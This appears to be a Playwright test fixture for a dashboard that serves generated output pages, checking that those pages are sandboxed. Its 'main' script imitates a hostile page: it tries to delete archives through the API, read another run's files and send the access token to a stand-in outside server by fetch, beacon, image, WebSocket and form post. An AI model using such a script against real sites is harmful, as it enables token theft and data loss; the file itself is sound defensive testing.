import { existsSync } from "node:fs";
import { mkdir, writeFile } from "node:fs/promises";
import { createServer } from "node:http";
import { join } from "node:path";
import test from "node:test";
import { chromium, type Page } from "playwright";
import { UI_ASSETS, createUiServer, listenUi } from "../../src/ui.js";
import { tempDirectory } from "./files.js";
import { judgedResult } from "./results.js";

const PNG = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg==", "base64");

/** Every browser step and the whole test give up rather than hang. */
const STEP_MS = 10_000;
export const TEST_MS = 45_000;

export const ready = existsSync(join(UI_ASSETS, "index.html")) && existsSync(chromium.executablePath());

const result = (runId: string, name: string, reportedAt: string) => judgedResult({ runId, name, reportedAt, task: "Draw a page." });

/** An output page that runs a module of its own, then tries what a hostile page would. */
const HOSTILE = `<!doctype html><title>loading</title><script type="module" src="./main.js"></script>`;
/** `away` is another server on this machine, standing in for the internet. */
const main = (away: string) => `
const attempt = async (action) => { try { const r = await action(); return String(r.status); } catch { return "blocked"; } };
const [, , token, ...rest] = decodeURIComponent(location.pathname).split("/");
const archive = "/" + rest.join("/").split("/outputs/")[0];
const read = await attempt(() => fetch("/api/experiments"));
const del = await attempt(() => fetch("/api/delete", { method: "POST", headers: { "Content-Type": "application/json", "X-Crucible": "1" }, body: JSON.stringify({ items: [[archive]] }) }));
const own = await attempt(() => fetch("./data.json"));
// The other copy of this run, through this page's own token.
const neighbour = await attempt(() => fetch("/files/" + token + archive.replace(/pages$/, "pages-copy") + "/outputs/a/data.json"));
const send = await attempt(() => fetch("${away}/fetch?" + token, { mode: "no-cors" }));
navigator.sendBeacon("${away}/beacon", token);
const image = await new Promise((done) => { const img = new Image(); img.onload = () => done("loaded"); img.onerror = () => done("blocked"); img.src = "${away}/image?" + token; });
try { new WebSocket("${away.replace("http", "ws")}/socket"); } catch {}
// Called once the results are read: a blocked form submission empties the page.
self.post = () => {
  const form = Object.assign(document.createElement("form"), { method: "post", action: "${away}/form" });
  form.append(Object.assign(document.createElement("input"), { name: "token", value: token }));
  document.body.append(form);
  form.submit();
};
document.title = JSON.stringify({ origin: self.origin, read, del, own, neighbour, send, image });
`;

/** A server that records every request it gets; none should arrive. */
export async function elsewhere(t: test.TestContext): Promise<{ url: string; hits: string[] }> {
  const hits: string[] = [];
  const server = createServer((request, response) => {
    hits.push(`${request.method} ${request.url}`);
    response.end();
  });
  await new Promise<void>((done) => server.listen(0, "127.0.0.1", done));
  t.after(() => new Promise<void>((done) => server.close(() => done())));
  const address = server.address();
  return { url: `http://localhost:${typeof address === "object" && address ? address.port : 0}`, hits };
}

/**
 * A deck that shows the slide its fragment names, advances on the right
 * arrow, tries to report home when it loads, and leaves for `away` on L.
 */
const deck = (away?: string) => `<!doctype html><title>deck</title><h1 id="slide"></h1><script>
const at = () => Number(location.hash.slice(2)) || 1;
const show = () => { document.getElementById("slide").textContent = "Slide " + at(); };
addEventListener("hashchange", show);
show();
addEventListener("keydown", (event) => {
  if (event.key === "ArrowRight") location.hash = "#/" + (at() + 1);
${away ? `  if (event.key === "l") location.href = "${away}/leave";` : ""}
});
${away ? `fetch("${away}/deck").then(() => { document.title = "sent"; }, () => { document.title = "blocked"; });` : ""}
</script>`;

async function addDecks(archiveRoot: string, away?: string) {
  const entry = join(archiveRoot, "decks");
  const shot = (artifact: string, desktop: string) => ({ page: "Second slide", artifact, desktop, phone: null });
  const shots = { arms: { a: [shot("deck.html#/2", "shots/a.png")], b: [shot("talk.html#/3", "shots/b.png")] } };
  await mkdir(join(entry, "shots"), { recursive: true });
  await writeFile(join(entry, "result.json"), JSON.stringify({ ...result("ab-00000002", "Decks", "2026-03-01T00:00:00Z"), shots }));
  for (const [label, files] of [["a", ["deck.html", "appendix.html"]], ["b", ["talk.html"]]] as const) {
    await mkdir(join(entry, "outputs", label), { recursive: true });
    await writeFile(join(entry, "shots", `${label}.png`), PNG);
    for (const file of files) await writeFile(join(entry, "outputs", label, file), deck(away));
  }
}

async function addSeries(archiveRoot: string) {
  const runs = [["2026-04-01T00:00:00Z", { a: 7.5, b: 9 }], ["2026-04-02T00:00:00Z", { a: 7.2, b: 8.6 }], ["2026-04-03T00:00:00Z", { a: 8.1, b: 7.9 }]] as const;
  for (const [i, [reportedAt, totals]] of runs.entries()) {
    const entry = join(archiveRoot, `series-${i}`);
    await mkdir(entry, { recursive: true });
    await writeFile(join(entry, "result.json"), JSON.stringify(judgedResult({ runId: `ab-2000000${i}`, name: "A series", task: "Draw a page.", reportedAt, totals: { ...totals }, series: "the-series" })));
  }
}

async function addWideRun(archiveRoot: string) {
  const entry = join(archiveRoot, "wide");
  await mkdir(entry, { recursive: true });
  const totals = Object.fromEntries(["a", "b", "c", "d", "e", "f", "g"].map((label, i) => [label, 6 + i * 0.3]));
  await writeFile(join(entry, "result.json"), JSON.stringify(judgedResult({ runId: "ab-30000000", name: "Seven arms", task: "Draw a page.", reportedAt: "2026-05-01T00:00:00Z", totals })));
}

async function addBusyRun(archiveRoot: string, runsRoot: string) {
  const entry = join(archiveRoot, "busy");
  await mkdir(entry, { recursive: true });
  await writeFile(join(entry, "result.json"), JSON.stringify(result("ab-40000000", "Busy question", "2026-06-01T00:00:00Z")));
  const now = new Date().toISOString();
  for (const [runId, state, producer] of [
    ["ab-40000000", "running", { state: "running", toolCalls: 1, pid: process.pid, startedAt: now, lastActivityAt: now }],
    ["ab-00000001", "reported", { state: "complete", toolCalls: 3 }],
  ] as const) {
    await mkdir(join(runsRoot, runId));
    await writeFile(join(runsRoot, runId, "state.json"), JSON.stringify({ runId, state, createdAt: now, updatedAt: now, producers: { p1: producer } }));
    await writeFile(join(runsRoot, runId, "resolved-config.json"), JSON.stringify({ name: runId, arms: [{ label: "a" }], producer: { timeoutMs: 600_000 }, judge: { timeoutMs: 600_000 } }));
  }
}

interface Scenario {
  extra?: number;
  decks?: boolean;
  series?: boolean;
  wide?: boolean;
  busy?: boolean;
  hostile?: string;
  away?: string;
}

export async function fixture(t: test.TestContext, { extra = 0, decks = false, series = false, wide = false, busy = false, hostile, away }: Scenario = {}) {
  const base = await tempDirectory(t, "crucible-dashboard-");
  const archiveRoot = join(base, "archive");
  const runsRoot = join(base, "runs");
  // One run archived twice: two questions that once shared a key.
  for (const [name, reportedAt] of [["pages", "2026-01-01T00:00:00Z"], ["pages-copy", "2026-02-01T00:00:00Z"]] as const) {
    const entry = join(archiveRoot, name);
    await mkdir(join(entry, "outputs", "a"), { recursive: true });
    await writeFile(join(entry, "result.json"), JSON.stringify(result("ab-00000001", `Question ${name}`, reportedAt)));
    await writeFile(join(entry, "report.html"), "<p>report</p>");
    await writeFile(join(entry, "outputs", "a", "preview.png"), PNG);
    await writeFile(join(entry, "outputs", "a", "index.html"), hostile ? HOSTILE : "<p>Output</p>");
    if (hostile) {
      await writeFile(join(entry, "outputs", "a", "main.js"), main(hostile));
      await writeFile(join(entry, "outputs", "a", "data.json"), "{}");
    }
  }
  for (let i = 1; i <= extra; i++) {
    const n = String(i).padStart(2, "0");
    const entry = join(archiveRoot, `extra-${n}`);
    await mkdir(entry, { recursive: true });
    await writeFile(join(entry, "result.json"), JSON.stringify(result(`ab-100000${n}`, `Extra ${n}`, `2025-12-${n}T00:00:00Z`)));
  }
  if (decks) await addDecks(archiveRoot, away);
  if (series) await addSeries(archiveRoot);
  if (wide) await addWideRun(archiveRoot);
  await mkdir(runsRoot, { recursive: true });
  if (busy) await addBusyRun(archiveRoot, runsRoot);
  const server = createUiServer({ archiveRoot, runsRoot, key: KEY });
  const port = await listenUi(server, 0);
  t.after(() => new Promise<void>((done) => {
    server.close(() => done());
    server.closeAllConnections();
  }));
  const url = `http://127.0.0.1:${port}/`;
  const { files } = await (await fetch(`${url}api/experiments`, { headers: { cookie: `crucible_key=${KEY}` }, signal: AbortSignal.timeout(STEP_MS) })).json() as { files: Record<string, string> };
  return { archiveRoot, runsRoot, url, files };
}

/** The key the test dashboards sign in with. */
const KEY = "b".repeat(64);

/** A browser signed in to every test dashboard: a cookie belongs to the host, whatever the port. */
export async function newPage(t: test.TestContext, options: { colorScheme?: "light" | "dark" } = {}): Promise<Page> {
  const instance = await chromium.launch({ timeout: STEP_MS });
  t.after(() => instance.close());
  const context = await instance.newContext(options);
  await context.addCookies([{ name: "crucible_key", value: KEY, domain: "127.0.0.1", path: "/", httpOnly: true, sameSite: "Strict" }]);
  const page = await context.newPage();
  page.setDefaultTimeout(STEP_MS);
  return page;
}
